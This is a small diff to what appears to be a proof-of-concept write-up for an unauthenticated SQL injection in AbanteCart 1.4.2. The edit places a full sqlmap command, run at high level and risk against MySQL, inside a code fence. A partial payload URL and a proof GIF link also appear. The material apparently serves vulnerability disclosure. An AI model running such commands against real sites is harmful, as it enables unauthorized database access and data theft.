@@ -33,8 +33,9 @@ Payload: https://abantecart.mydomain.local/index.php?rt=extension/generic&layout
 
 
 This is a unique case where cookies are wanted to be set.  This is the best command to use
- python3 ~/tools/sqlmapproject-sqlmap-c8c7fee/sqlmap.py -r ./sql.txt --level 5 --risk 3 --force-ssl --dbms mysql --answers='you have not declared cookie=n,Do you want to follow?=y' --flush
-
+```
+python3 ~/tools/sqlmapproject-sqlmap-c8c7fee/sqlmap.py -r ./sql.txt --level 5 --risk 3 --force-ssl --dbms mysql --answers='you have not declared cookie=n,Do you want to follow?=y' --flush
+```
 
 ![](https://github.com/4rdr/proofs/blob/main/gifs/abante-1.4.2-unauthenticated-sql-injection.gif?raw=true)
 
